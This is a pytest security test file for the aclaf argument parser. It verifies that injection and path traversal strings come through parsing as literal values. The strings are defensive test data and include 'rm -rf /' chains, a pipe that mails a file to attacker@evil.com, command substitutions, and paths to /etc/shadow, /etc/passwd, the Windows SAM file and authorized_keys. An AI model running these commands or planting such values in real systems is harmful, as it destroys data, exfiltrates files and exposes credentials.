"""Security tests for command injection protection.

This module tests the parser's resistance to command injection attacks through
malicious input. The parser should treat all input as literal data, not as
executable commands or shell metacharacters.

## Test categories

### Shell metacharacter escaping
Tests that shell metacharacters in option values are preserved as literal strings
and not interpreted as command separators or operators.

### Path traversal protection
Tests that path traversal attempts are properly handled and flagged, preventing
access to unauthorized directories.

## Security considerations

The parser itself doesn't execute commands or access files - it only parses
arguments into structured data. However, these tests verify that:

1. Parsed values are preserved exactly as provided (no interpolation)
2. Dangerous patterns are detectable by downstream validation
3. No special interpretation of shell syntax occurs during parsing

Applications using this parser must still validate and sanitize values before
using them in file operations or command execution.
"""

import pytest

from aclaf.parser import CommandSpec, OptionSpec, Parser
from aclaf.parser.types import EXACTLY_ONE_ARITY


@pytest.mark.security
class TestShellMetacharacterHandling:
    """Test that shell metacharacters are preserved as literal strings."""

    def test_semicolon_preserved_as_literal(self):
        """Semicolon command separator is preserved as literal string.

        Shell metacharacter: ; (command separator)
        Attack vector: --cmd "rm file.txt; rm -rf /"

        The parser should preserve the semicolon as part of the option value,
        not interpret it as a command separator.
        """
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "rm file.txt; rm -rf /"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        # Verify semicolon is preserved literally
        assert ";" in result.options["command"].value

    def test_ampersand_preserved_as_literal(self):
        """Ampersand background operator is preserved as literal string.

        Shell metacharacter: & (background execution)
        Attack vector: --cmd "sleep 10 & echo 'hacked'"

        The parser should preserve the ampersand as part of the option value.
        """
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "sleep 10 & echo 'hacked'"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        assert "&" in result.options["command"].value

    def test_pipe_preserved_as_literal(self):
        """Pipe operator is preserved as literal string.

        Shell metacharacter: | (pipe operator)
        Attack vector: --cmd "cat file.txt | mail attacker@evil.com"

        The parser should preserve the pipe as part of the option value.
        """
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "cat file.txt | mail attacker@evil.com"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        assert "|" in result.options["command"].value

    def test_backtick_preserved_as_literal(self):
        """Backtick command substitution is preserved as literal string.

        Shell metacharacter: ` (command substitution)
        Attack vector: --cmd "`whoami`"

        The parser should preserve backticks as part of the option value.
        """
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "`whoami`"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        assert "`" in result.options["command"].value

    def test_dollar_paren_preserved_as_literal(self):
        """Dollar-paren command substitution is preserved as literal string.

        Shell metacharacter: $() (command substitution)
        Attack vector: --cmd "$(ls -la)"

        The parser should preserve $() as part of the option value.
        """
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "$(ls -la)"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        assert "$(" in result.options["command"].value
        assert ")" in result.options["command"].value

    def test_multiple_metacharacters_preserved(self):
        """Multiple shell metacharacters are preserved together.

        Complex attack vector combining multiple shell metacharacters:
        --cmd "rm -rf /; echo 'done' | mail user@host & $(whoami)"

        The parser should preserve all metacharacters literally.
        """
        spec = CommandSpec(
            name="cmd",
            options={"command": OptionSpec("command", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        malicious_input = "rm -rf /; echo 'done' | mail user@host & $(whoami)"
        result = parser.parse(["--command", malicious_input])

        assert isinstance(result.options["command"].value, str)
        assert result.options["command"].value == malicious_input
        # Verify all dangerous characters are preserved
        assert ";" in result.options["command"].value
        assert "|" in result.options["command"].value
        assert "&" in result.options["command"].value
        assert "$(" in result.options["command"].value


@pytest.mark.security
class TestPathTraversalPreservation:
    """Test that path traversal patterns are preserved for downstream validation."""

    def test_unix_path_traversal_preserved(self):
        """Unix-style path traversal is preserved for downstream validation.

        Attack vector: --file "../../../etc/passwd"

        The parser preserves this value, allowing downstream code to detect
        and reject the path traversal attempt.
        """
        spec = CommandSpec(
            name="cmd",
            options={"file": OptionSpec("file", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        traversal_path = "../../../etc/passwd"
        result = parser.parse(["--file", traversal_path])

        assert isinstance(result.options["file"].value, str)
        assert result.options["file"].value == traversal_path
        # Verify path traversal pattern is preserved for validation
        assert "../" in result.options["file"].value

    def test_windows_path_traversal_preserved(self):
        """Windows-style path traversal is preserved for downstream validation.

        Attack vector: --file "..\\..\\..\\windows\\system32\\config\\sam"

        The parser preserves this value, allowing downstream code to detect
        and reject the path traversal attempt.
        """
        spec = CommandSpec(
            name="cmd",
            options={"file": OptionSpec("file", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        traversal_path = "..\\..\\..\\windows\\system32\\config\\sam"
        result = parser.parse(["--file", traversal_path])

        assert isinstance(result.options["file"].value, str)
        assert result.options["file"].value == traversal_path
        # Verify path traversal pattern is preserved for validation
        assert "..\\" in result.options["file"].value

    def test_redundant_path_traversal_preserved(self):
        """Redundant path components are preserved for validation.

        Attack vector: --file "/etc/../etc/passwd"

        This uses redundant path components to bypass simple filters.
        The parser preserves the exact path for validation.
        """
        spec = CommandSpec(
            name="cmd",
            options={"file": OptionSpec("file", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        traversal_path = "/etc/../etc/passwd"
        result = parser.parse(["--file", traversal_path])

        assert isinstance(result.options["file"].value, str)
        assert result.options["file"].value == traversal_path
        assert "/../" in result.options["file"].value

    def test_absolute_path_preserved(self):
        """Absolute paths that might be restricted are preserved.

        Attack vector: --file "/etc/shadow"

        While not path traversal, direct access to sensitive files should
        be detectable by downstream validation.
        """
        spec = CommandSpec(
            name="cmd",
            options={"file": OptionSpec("file", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        sensitive_path = "/etc/shadow"
        result = parser.parse(["--file", sensitive_path])

        assert isinstance(result.options["file"].value, str)
        assert result.options["file"].value == sensitive_path
        # Absolute path is preserved for validation
        assert result.options["file"].value.startswith("/")


@pytest.mark.security
class TestEnvironmentVariableHandling:
    """Test that environment variable syntax is preserved as literals."""

    def test_environment_variable_preserved(self):
        """Environment variable references are preserved as literal strings.

        Attack vector: --output "$HOME/.ssh/authorized_keys"

        The parser should NOT expand environment variables, preserving them
        as literal strings for downstream handling.
        """
        spec = CommandSpec(
            name="cmd",
            options={"output": OptionSpec("output", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        env_var_input = "$HOME/.ssh/authorized_keys"
        result = parser.parse(["--output", env_var_input])

        assert isinstance(result.options["output"].value, str)
        assert result.options["output"].value == env_var_input
        # Verify $HOME is NOT expanded
        assert "$HOME" in result.options["output"].value

    def test_brace_env_variable_preserved(self):
        """Brace-enclosed environment variables are preserved.

        Attack vector: --config "${XDG_CONFIG_HOME}/malicious.conf"

        The parser should preserve ${VAR} syntax literally.
        """
        spec = CommandSpec(
            name="cmd",
            options={"config": OptionSpec("config", arity=EXACTLY_ONE_ARITY)},
        )
        parser = Parser(spec)

        env_var_input = "${XDG_CONFIG_HOME}/malicious.conf"
        result = parser.parse(["--config", env_var_input])

        assert isinstance(result.options["config"].value, str)
        assert result.options["config"].value == env_var_input
        # Verify ${VAR} is preserved literally
        assert "${XDG_CONFIG_HOME}" in result.options["config"].value
